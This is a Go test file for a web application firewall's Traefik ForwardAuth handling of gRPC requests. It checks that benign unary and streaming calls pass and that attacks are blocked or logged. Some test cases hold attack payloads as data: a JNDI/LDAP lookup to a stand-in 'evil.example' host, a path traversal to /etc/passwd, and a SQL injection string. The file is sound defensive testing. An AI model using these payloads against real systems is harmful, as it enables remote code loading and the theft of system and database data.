// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package forwardauth

import (
	"bytes"
	"encoding/binary"
	"net/http"
	"strings"
	"testing"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
)

// grpcMessages frames each message as gRPC does: a compressed flag, a
// 4-byte length, the message. Each message is a protobuf string field 1.
func grpcMessages(names ...string) string {
	var b []byte
	for _, n := range names {
		msg := append([]byte{0x0a, byte(len(n))}, n...)
		b = append(b, 0, 0, 0, 0, 0)
		binary.BigEndian.PutUint32(b[len(b)-4:], uint32(len(msg)))
		b = append(b, msg...)
	}
	return string(b)
}

// grpcSubrequest is what Traefik's ForwardAuth sends for a gRPC call (h2c
// to Traefik): the client's gRPC headers and its body.
func grpcSubrequest(uri, body string, kv ...string) *http.Request {
	r := subrequest("POST", uri, "application/grpc", body)
	r.Header.Set("User-Agent", "grpc-go/1.75.0")
	r.Header.Del("Accept")
	r.Header.Set("Te", "trailers")
	r.Header.Set("Grpc-Timeout", "9998m")
	for i := 0; i+1 < len(kv); i += 2 {
		r.Header.Add(kv[i], kv[i+1])
	}
	return r
}

// TestGRPC: gRPC calls through Traefik's ForwardAuth, with the embedded
// CRS. Before v0.3.1 they were all denied in block mode (920420, and 920270
// and 921150 on the binary body) and logged in detect mode.
func TestGRPC(t *testing.T) {
	const limit = 64
	stream := grpcMessages("alpha", "beta", "gamma", "delta", "epsilon", "zeta", "eta", "theta", "iota")
	tests := []struct {
		name string
		req  func() *http.Request
		want int
	}{
		{"unary", func() *http.Request { return grpcSubrequest("/helloworld.Greeter/SayHello", grpcMessages("world")) }, http.StatusOK},
		{"client stream", func() *http.Request {
			return grpcSubrequest("/routeguide.RouteGuide/RecordRoute", grpcMessages("a", "b", "c"))
		}, http.StatusOK},
		// Over the limit: a gRPC body isn't inspected, so it isn't
		// oversized either.
		{"client stream over the limit", func() *http.Request { return grpcSubrequest("/routeguide.RouteGuide/RecordRoute", stream) }, http.StatusOK},
		{"attack in metadata", func() *http.Request {
			return grpcSubrequest("/helloworld.Greeter/SayHello", grpcMessages("world"), "X-Api-Key", "${jndi:ldap://evil.example/a}")
		}, http.StatusForbidden},
		{"attack in the path", func() *http.Request {
			return grpcSubrequest("/helloworld.Greeter/../../../../etc/passwd", grpcMessages("world"))
		}, http.StatusForbidden},
		// A JSON body only labelled gRPC is inspected as before.
		{"json labelled grpc", func() *http.Request {
			return grpcSubrequest("/api/search", `{"q":"1' OR '1'='1' -- "}`)
		}, http.StatusForbidden},
	}
	for _, mode := range []pipeline.Mode{pipeline.ModeBlock, pipeline.ModeDetect} {
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				var logs bytes.Buffer
				h := newHandler(t, mode, limit, &logs)
				want := tt.want
				if mode == pipeline.ModeDetect {
					want = http.StatusOK
				}
				if w := serve(h, tt.req()); w.Code != want {
					t.Fatalf("mode %d: got %d, want %d; events: %s", mode, w.Code, want, logs.String())
				}
				if logged := strings.Contains(logs.String(), "security event"); logged != (tt.want != http.StatusOK) {
					t.Fatalf("mode %d: events %q, want one only for an attack", mode, logs.String())
				}
			})
		}
	}
}
